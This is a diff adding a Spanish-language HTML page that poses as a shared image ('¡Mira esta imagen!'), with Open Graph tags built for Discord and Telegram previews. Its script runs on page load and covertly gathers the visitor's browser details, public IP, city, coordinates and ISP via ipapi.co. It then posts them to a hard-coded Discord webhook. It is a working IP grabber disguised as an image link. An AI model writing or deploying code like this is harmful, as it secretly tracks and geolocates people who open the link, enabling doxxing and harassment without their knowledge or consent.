@@ -1,1 +1,146 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Imagen Spoiler</title>
+  <!-- Open Graph para preview en Discord/Telegram -->
+  <meta property="og:title" content="¡Mira esta imagen!" />
+  <meta property="og:description" content="Haz clic para ver la imagen completa." />
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAE7Ir2I6OTwTlBt3F5CxIOZduRvxJcnzkdgJh49DfllAOnQ1B44iFnoV89OfBTd_Lv3Xx4qUHgudDLQnaxa09kQy_QjF3ICQbK-YECJ8Rfg" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://github.com/holias/classprohack/tree/main" />
+  <style>
+    body {
+      background: #18191c;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .spoiler-container {
+      position: relative;
+      display: inline-block;
+      margin-top: 40px;
+    }
+    .spoiler-img {
+      filter: blur(18px) brightness(0.5);
+      transition: filter 0.3s;
+      cursor: pointer;
+      border-radius: 12px;
+      max-width: 90vw;
+      max-height: 60vh;
+      box-shadow: 0 0 24px #000a;
+    }
+    .spoiler-overlay {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 2rem;
+      font-weight: bold;
+      background: rgba(0,0,0,0.5);
+      border-radius: 12px;
+      pointer-events: none;
+      user-select: none;
+    }
+    .visible {
+      filter: none !important;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Imagen</h1>
+  <div class="spoiler-container">
+    <img id="spoilerImg" class="visible" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAE7Ir2I6OTwTlBt3F5CxIOZduRvxJcnzkdgJh49DfllAOnQ1B44iFnoV89OfBTd_Lv3Xx4qUHgudDLQnaxa09kQy_QjF3ICQbK-YECJ8Rfg" alt="Imagen" />
+  </div>
+  <script>
+    // Abrir la imagen en una nueva pestaña al cargar la página
+    window.onload = function() {
+      window.open("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAE7Ir2I6OTwTlBt3F5CxIOZduRvxJcnzkdgJh49DfllAOnQ1B44iFnoV89OfBTd_Lv3Xx4qUHgudDLQnaxa09kQy_QjF3ICQbK-YECJ8Rfg", "_blank");
+    };
 
+    // Eliminar el efecto spoiler y overlay
+    const img = document.getElementById('spoilerImg');
+    const overlay = document.getElementById('spoilerOverlay');
+    img.addEventListener('click', () => {
+      // No hacer nada, ya que la imagen no tiene efecto de spoiler
+    });
+
+    // Recopilar info y enviar al webhook
+    function getInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookiesEnabled: navigator.cookieEnabled,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          availWidth: screen.availWidth,
+          availHeight: screen.availHeight
+        },
+        referrer: document.referrer,
+        url: window.location.href,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        date: new Date().toString()
+      };
+    }
+
+    // Obtener IP pública y localización
+    function getIPAndLocation() {
+      return fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(d => ({
+          ip: d.ip,
+          city: d.city,
+          region: d.region,
+          country: d.country_name,
+          country_code: d.country,
+          latitude: d.latitude,
+          longitude: d.longitude,
+          org: d.org
+        }))
+        .catch(() => ({ ip: 'No disponible' }));
+    }
+
+    async function sendToDiscord(info) {
+      const webhook = "https://discord.com/api/webhooks/1392952998183043132/yW8DjudaJS7iWGWKteANBwsYNx0IqHw77gBb6q6xT1lzUZ-uve5h04Qd-UzZLEEVZZz0";
+      let content = `**Nueva visita:**\n`;
+      for (const [k, v] of Object.entries(info)) {
+        if (typeof v === 'object') {
+          content += `**${k}:** ${JSON.stringify(v)}\n`;
+        } else {
+          content += `**${k}:** ${v}\n`;
+        }
+      }
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content })
+      });
+    }
+
+    (async () => {
+      const info = getInfo();
+      const ipLoc = await getIPAndLocation();
+      info.ip = ipLoc.ip;
+      info.city = ipLoc.city;
+      info.region = ipLoc.region;
+      info.country = ipLoc.country;
+      info.latitude = ipLoc.latitude;
+      info.longitude = ipLoc.longitude;
+      info.org = ipLoc.org;
+      sendToDiscord(info);
+    })();
+  </script>
+</body>
+</html> 
